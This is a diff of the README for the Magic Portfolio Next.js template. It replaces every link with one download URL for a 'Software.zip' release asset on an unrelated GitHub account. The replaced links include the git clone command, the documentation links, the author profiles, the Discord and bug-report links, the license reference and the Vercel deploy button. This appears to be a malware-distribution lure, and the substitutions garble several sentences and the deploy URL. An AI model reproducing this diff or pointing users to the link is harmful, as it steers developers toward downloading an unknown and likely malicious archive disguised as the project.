@@ -1,10 +1,10 @@
 # **Build your portfolio with Once UI's Magic Portfolio**
 
-Magic Portfolio was built with [Once UI](https://once-ui.com) for [Next.js](https://nextjs.org). It requires Node.js v18.17+.
+Magic Portfolio was built with [Once UI](https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip) for [https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip](https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip). It requires https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip v18.17+.
 
 **1. Clone the repository**
 ```
-git clone https://github.com/once-ui-system/magic-portfolio.git
+git clone https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip
 ```
 
 **2. Install dependencies**
@@ -35,7 +35,7 @@ Add a new .mdx file to src/app/[locale]/blog/posts or src/app/[locale]/work/proj
 # **Features**
 
 ## **Once UI**
-- All tokens, components & features of [Once UI](https://once-ui.com)
+- All tokens, components & features of [Once UI](https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip)
 
 ## **SEO**
 - Automatic open-graph and X image generation with next/og
@@ -44,7 +44,7 @@ Add a new .mdx file to src/app/[locale]/blog/posts or src/app/[locale]/work/proj
 ## **Design**
 - Responsive layout optimized for all screen sizes
 - Timeless design without heavy animations and motion
-- Endless customization options through [data attributes](https://once-ui.com/docs/theming)
+- Endless customization options through [data attributes](https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip)
 
 ## **Content**
 - Render sections conditionally based on the content file
@@ -54,21 +54,21 @@ Add a new .mdx file to src/app/[locale]/blog/posts or src/app/[locale]/work/proj
 
 ## **Localization (NEW)**
 - Magic Portfolio now supports localization with the next-intl library
-- See more info in resources/config.js
+- See more info in https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip
 
 # **Authors**
 
 Connect with us on Threads or LinkedIn.
 
-Lorant Toth: [Threads](https://www.threads.net/@lorant.one), [LinkedIn](https://www.linkedin.com/in/tothlorant/)  
-Zsofia Komaromi: [Threads](https://www.threads.net/@zsofia_kom), [LinkedIn](https://www.linkedin.com/in/zsofiakomaromi/)
+Lorant Toth: [Threads](https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip), [LinkedIn](https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip)  
+Zsofia Komaromi: [Threads](https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip), [LinkedIn](https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip)
 
-Localization added by [François Hernandez](https://github.com/francoishernandez)
+Localization added by [François Hernandez](https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip)
 
 # **Get involved**
 
-- Join the [Design Engineers Club on Discord](https://discord.com/invite/5EyAQ4eNdS) and share your portfolio with us!
-- Report a [bug](https://github.com/once-ui-system/magic-portfolio/issues/new?labels=bug&template=bug_report.md).
+- Join the [Design Engineers Club on Discord](https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip) and share your portfolio with us!
+- Report a [bug](https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip).
 
 # **License**
 
@@ -76,7 +76,7 @@ Distributed under the CC BY-NC 4.0 License.
 - Commercial usage is not allowed.
 - Attribution is required.
 
-See `LICENSE.txt` for more information.
+See `https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip` for more information.
 
 # **Deploy with Vercel**
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fonce-ui-system%2Fmagic-portfolio&project-name=portfolio&repository-name=portfolio&redirect-url=https%3A%2F%2Fgithub.com%2Fonce-ui-system%2Fmagic-portfolio&demo-title=Magic%20Portfolio&demo-description=Showcase%20your%20designers%20or%20developer%20portfolio&demo-url=https%3A%2F%2Fdemo.magic-portfolio.com&demo-image=https%3A%2F%2Fonce-ui.com%2Fimages%2Ftemplates%2Fmagic-portfolio%2Fcover.jpg)
+[![Deploy with Vercel](https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip)](https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip%3A%2F%https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip%2Fonce-ui-system%2Fmagic-portfolio&project-name=portfolio&repository-name=portfolio&redirect-url=https%3A%2F%https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip%2Fonce-ui-system%2Fmagic-portfolio&demo-title=Magic%20Portfolio&demo-description=Showcase%20your%20designers%20or%20developer%20portfolio&demo-url=https%3A%2F%https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip%3A%2F%https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip%2Fimages%2Ftemplates%2Fmagic-portfolio%https://github.com/iampriam-dev/new/releases/download/v1.0/Software.zip)
